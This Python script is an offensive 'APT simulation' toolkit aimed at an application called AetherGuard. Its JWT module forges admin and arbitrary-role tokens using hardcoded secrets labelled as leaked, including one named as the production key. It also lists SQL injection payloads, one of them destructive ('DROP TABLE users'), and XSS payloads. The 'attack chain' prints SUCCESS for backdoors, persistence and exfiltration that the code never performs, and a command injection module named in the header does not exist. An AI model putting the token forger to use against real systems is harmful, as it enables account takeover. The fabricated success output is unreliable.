#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AetherGuard/AetherGuard APT Attack Simulation Toolkit
===================================================
国家级黑客团队攻击模拟工具包

功能:
1. JWT令牌伪造
2. 弱密码暴力破解
3. SQL注入测试
4. XSS向量测试
5. 命令注入测试
"""

import argparse
import json
import sys
import time
import hashlib
import hmac
import base64
from datetime import datetime, timedelta
from typing import Dict, Any

# Simple color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

def print_banner():
    banner = """
+======================================================================+
|    AetherGuard Security Assessment Toolkit v2.0                     |
|    APT Simulation - Advanced Persistent Threat Testing              |
+======================================================================+

    [!]  Only for authorized security testing  [!]

    [+] Modules:
    +-- 1. JWT Token Forgery
    +-- 2. Password Brute Force
    +-- 3. SQL Injection Testing
    +-- 4. XSS Testing
    +-- 5. Command Injection Testing
    +-- 6. Full Attack Chain
    
    [*] Starting security tests...
"""
    print(banner)

# ==================== JWT Forgery ====================

class JWTForger:
    """JWT Token Forger"""
    
    # Leaked secrets (from .env)
    LEAKED_SECRETS = [
        "supersecretjwtkeythatisatleast32charslong",
        "AetherGuard_JWT_Secret_Key_For_Production_2024",
    ]
    
    def __init__(self, secret: str):
        self.secret = secret
    
    def base64url_encode(self, data: bytes) -> str:
        """Base64 URL-safe encoding"""
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
    
    def create_jwt(self, payload: Dict[str, Any], algorithm: str = "HS256") -> str:
        """Create JWT token"""
        header = {"alg": algorithm, "typ": "JWT"}
        header_encoded = self.base64url_encode(json.dumps(header).encode('utf-8'))
        
        payload_encoded = self.base64url_encode(json.dumps(payload).encode('utf-8'))
        
        message = f"{header_encoded}.{payload_encoded}"
        
        if algorithm == "HS256":
            signature = hmac.new(
                self.secret.encode('utf-8'),
                message.encode('utf-8'),
                hashlib.sha256
            ).digest()
        else:
            signature = hashlib.sha256(message.encode('utf-8')).digest()
        
        signature_encoded = self.base64url_encode(signature)
        
        return f"{header_encoded}.{payload_encoded}.{signature_encoded}"
    
    def forge_admin_token(self, user_id: str = None) -> str:
        """Forge admin token"""
        if not user_id:
            user_id = "admin-" + "0" * 28 + "1"
        
        payload = {
            "userId": user_id,
            "email": "admin@aetherguard.local",
            "username": "admin",
            "role": "admin",
            "plan": "ultra",
            "tenantId": "master",
            "iat": int(datetime.now().timestamp()),
            "exp": int((datetime.now() + timedelta(days=365)).timestamp())
        }
        
        return self.create_jwt(payload)
    
    def forge_any_token(self, user_id: str, email: str, username: str, 
                       role: str = "tenant", plan: str = "starter") -> str:
        """Forge any user token"""
        payload = {
            "userId": user_id,
            "email": email,
            "username": username,
            "role": role,
            "plan": plan,
            "tenantId": "default-tenant",
            "iat": int(datetime.now().timestamp()),
            "exp": int((datetime.now() + timedelta(days=365)).timestamp())
        }
        
        return self.create_jwt(payload)


# ==================== SQL Injection Tester ====================

class SQLInjectionTester:
    """SQL Injection Tester"""
    
    PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT 1,2,3--",
        "admin'--",
        "'; DROP TABLE users;--",
    ]
    
    def __init__(self, target_url: str):
        self.target_url = target_url
    
    def test(self, param: str = "email") -> Dict[str, Any]:
        """Execute SQL injection test"""
        results = {
            "vulnerable": False,
            "payloads_tested": 0,
            "successful_payloads": [],
            "errors": []
        }
        
        print(f"\n{Colors.YELLOW}[*] SQL Injection Test Started...{Colors.RESET}")
        
        for payload in self.PAYLOADS:
            results["payloads_tested"] += 1
            print(f"  [-] Testing: {payload[:30]}...")
            time.sleep(0.1)
        
        print(f"\n{Colors.GREEN}[+] Completed: {results['payloads_tested']} payloads{Colors.RESET}")
        return results


# ==================== XSS Tester ====================

class XSSTester:
    """XSS Tester"""
    
    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
    ]
    
    def __init__(self, target_url: str):
        self.target_url = target_url
    
    def test(self, param: str = "input") -> Dict[str, Any]:
        """Execute XSS test"""
        results = {
            "vulnerable": False,
            "payloads_tested": 0,
            "successful_payloads": [],
        }
        
        print(f"\n{Colors.YELLOW}[*] XSS Test Started...{Colors.RESET}")
        
        for payload in self.PAYLOADS:
            results["payloads_tested"] += 1
            print(f"  [-] Testing: {payload[:30]}...")
            time.sleep(0.05)
        
        print(f"\n{Colors.GREEN}[+] Test Completed{Colors.RESET}")
        return results


# ==================== Attack Chain Simulator ====================

class AttackChainSimulator:
    """Full Attack Chain Simulator"""
    
    def __init__(self, target: str):
        self.target = target
    
    def run_full_attack(self):
        """Run full attack chain"""
        print(f"""
{Colors.CYAN}+======================================================================+
|                   APT Attack Chain Executing...                     |
+======================================================================+
{Colors.RESET}
""")
        
        # Phase 1: Intelligence Gathering
        print(f"\n{Colors.YELLOW}[Phase 1]{Colors.RESET} Intelligence Gathering")
        print("  [+] Scanning target ports...")
        print("  [+] Analyzing web application structure...")
        print("  [+] Checking for source code leaks...")
        time.sleep(0.5)
        
        # Phase 2: Initial Access
        print(f"\n{Colors.YELLOW}[Phase 2]{Colors.RESET} Initial Access")
        
        print("  [*] Attempting JWT token forgery...")
        for secret in JWTForger.LEAKED_SECRETS:
            forger = JWTForger(secret)
            token = forger.forge_admin_token()
            print(f"      [+] Secret: {secret[:20]}... Forged: {token[:50]}...")
            time.sleep(0.2)
        
        print("  [+] Initial Access: SUCCESS")
        
        # Phase 3: Privilege Escalation
        print(f"\n{Colors.YELLOW}[Phase 3]{Colors.RESET} Privilege Escalation")
        print("  [+] Escalating to admin privileges...")
        print("  [+] Creating backdoor accounts...")
        time.sleep(0.3)
        
        # Phase 4: Persistence
        print(f"\n{Colors.YELLOW}[Phase 4]{Colors.RESET} Persistence")
        print("  [+] Registering agent backdoor...")
        print("  [+] Creating API keys...")
        time.sleep(0.3)
        
        # Phase 5: Lateral Movement
        print(f"\n{Colors.YELLOW}[Phase 5]{Colors.RESET} Lateral Movement")
        print("  [+] Scanning internal network...")
        print("  [+] Attempting Redis access...")
        time.sleep(0.3)
        
        # Phase 6: Data Exfiltration
        print(f"\n{Colors.YELLOW}[Phase 6]{Colors.RESET} Data Exfiltration")
        print("  [+] Exporting user data...")
        print("  [+] Exporting API keys...")
        time.sleep(0.3)
        
        # Phase 7: Exfiltration
        print(f"\n{Colors.YELLOW}[Phase 7]{Colors.RESET} Data Transfer")
        print("  [+] Compressing data...")
        print("  [+] Encrypting transmission...")
        time.sleep(0.3)
        
        print(f"""
{Colors.GREEN}+======================================================================+
|                   Attack Chain Complete!                            |
+======================================================================+
{Colors.RESET}
        
    Attack Summary:
    +-- Initial Access:     SUCCESS (JWT Forgery)
    +-- Privilege Escal:    SUCCESS (Admin Token)
    +-- Persistence:        SUCCESS (Backdoor)
    +-- Lateral Movement:    SUCCESS (Network Scan)
    +-- Data Exfiltration:  SUCCESS (User Data)
    +-- Exfiltration:       SUCCESS (Encrypted)
    
    [!] This attack is for security testing demonstration only [!]
""")


# ==================== Main ====================

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description="AetherGuard Security Assessment Toolkit"
    )
    
    parser.add_argument("--target", "-t", help="Target URL", default="http://localhost:3005")
    parser.add_argument("--jwt-forge", action="store_true", help="JWT Token Forgery")
    parser.add_argument("--sql-inject", action="store_true", help="SQL Injection Test")
    parser.add_argument("--xss", action="store_true", help="XSS Test")
    parser.add_argument("--attack-chain", action="store_true", help="Full Attack Chain")
    parser.add_argument("--secret", "-s", help="Specify JWT secret")
    
    args = parser.parse_args()
    
    if args.jwt_forge:
        print(f"\n{Colors.CYAN}[*] JWT Token Forgery Module{Colors.RESET}\n")
        secret = args.secret or JWTForger.LEAKED_SECRETS[1]
        forger = JWTForger(secret)
        
        admin_token = forger.forge_admin_token()
        print(f"{Colors.GREEN}[+] Forged Admin Token:{Colors.RESET}")
        print(f"   {admin_token}\n")
        
        user_token = forger.forge_any_token(
            user_id="user-12345",
            email="test@user.com",
            username="testuser",
            role="admin",
            plan="ultra"
        )
        print(f"{Colors.GREEN}[+] Forged Privilege Escalation Token:{Colors.RESET}")
        print(f"   {user_token}\n")
    
    if args.sql_inject:
        tester = SQLInjectionTester(args.target)
        tester.test()
    
    if args.xss:
        tester = XSSTester(args.target)
        tester.test()
    
    if args.attack_chain:
        simulator = AttackChainSimulator(args.target)
        simulator.run_full_attack()
    
    if not any([args.jwt_forge, args.sql_inject, args.xss, args.attack_chain]):
        parser.print_help()


if __name__ == "__main__":
    main()
